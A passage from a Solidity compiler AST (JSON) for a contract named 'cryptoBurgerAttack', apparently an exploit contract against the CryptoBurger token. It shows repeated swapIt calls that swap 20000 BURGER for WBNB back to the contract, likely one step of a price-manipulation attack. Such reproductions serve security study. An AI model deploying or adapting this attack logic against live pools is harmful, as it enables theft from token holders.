                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1189,
                  "nodeType": "ExpressionStatement",
                  "src": "10728:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1191,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10806:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1192,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10814:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1195,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1193,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10820:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1194,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10828:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10820:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1196,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10834:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1201,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10853:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1200,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10845:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1199,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10845:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1202,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10845:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1198,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10837:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1197,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10837:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1203,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10837:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1190,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10799:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1204,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10799:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1205,
                  "nodeType": "ExpressionStatement",
                  "src": "10799:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1207,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10877:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1208,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10885:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1211,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1209,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10891:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1210,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10899:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10891:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1212,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10905:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1217,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10924:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1216,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10916:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1215,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10916:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1218,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10916:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1214,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10908:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1213,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10908:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1219,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10908:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1206,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10870:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1220,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10870:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1221,
                  "nodeType": "ExpressionStatement",
                  "src": "10870:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1223,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10948:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1224,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10956:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1227,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1225,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10962:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1226,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10970:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10962:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1228,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10976:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1233,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10995:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1232,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10987:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1231,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10987:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1234,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10987:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1230,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10979:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1229,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10979:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1235,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10979:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1222,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10941:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1236,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10941:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1237,
                  "nodeType": "ExpressionStatement",
                  "src": "10941:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1239,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "11019:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1240,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "11027:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1243,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1241,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11033:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1242,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11041:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "11033:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1244,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11047:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1249,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11066:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1248,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11058:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1247,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11058:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1250,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11058:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1246,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "11050:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1245,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "11050:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1251,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11050:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1238,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "11012:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1252,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11012:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1253,
                  "nodeType": "ExpressionStatement",
                  "src": "11012:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1255,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "11090:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1256,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "11098:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1259,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1257,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11104:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1258,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "11112:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "11104:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1260,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11118:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1265,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "11137:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1264,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11129:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1263,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11129:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1266,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11129:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1262,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "11121:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1261,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "11121:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1267,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11121:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1254,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "11083:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1268,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11083:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1269,
                  "nodeType": "ExpressionStatement",
                  "src": "11083:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1271,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "11161:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
